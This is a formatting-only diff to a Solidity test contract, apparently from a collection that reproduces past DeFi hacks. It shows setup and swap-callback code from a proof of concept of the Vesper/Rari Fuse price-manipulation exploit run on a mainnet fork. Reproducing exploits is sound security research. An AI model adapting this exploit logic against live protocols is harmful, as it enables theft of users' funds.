@@ -97,7 +97,7 @@ contract Exploit_VesperRariFuse is TestHarness, ModuleImports {
 
     function setUp() external {
         forkId = cheat.createSelectFork(vm.envString("RPC_URL"), 13_537_921); // Just one block before the
-            // manipulation.
+        // manipulation.
         // We will roll the blocknumber later.
 
         cheat.deal(address(this), 99.92 ether); // Received from tornado cash
@@ -247,7 +247,12 @@ contract Exploit_VesperRariFuse is TestHarness, ModuleImports {
         logBalances(address(this));
     }
 
-    function uniswapV3SwapCallback(int256, /* amount0Delta */ int256 amount1Delta, bytes memory /* data */ )
+    function uniswapV3SwapCallback(
+        int256,
+        /* amount0Delta */
+        int256 amount1Delta,
+        bytes memory /* data */
+    )
         external
     {
         // Means that this callback is called for the first time while getting USDC
@@ -256,7 +261,7 @@ contract Exploit_VesperRariFuse is TestHarness, ModuleImports {
             require(msg.sender == address(pairUsdcWeth), "Only USDC-WETH pair");
 
             weth.transfer(address(pairUsdcWeth), weth.balanceOf(address(this))); // We are swapping all our
-                // WETH
+            // WETH
         }
 
         // Means that this callback is called while getting all the VUSD
@@ -264,7 +269,7 @@ contract Exploit_VesperRariFuse is TestHarness, ModuleImports {
             require(msg.sender == address(pairUsdcVusd), "Only USDC-VUSD pair");
 
             IERC20(tokens[0]).transfer(address(pairUsdcVusd), uint256(amount1Delta)); // Send the USDC
-                // counterpart
+            // counterpart
         }
     }
 
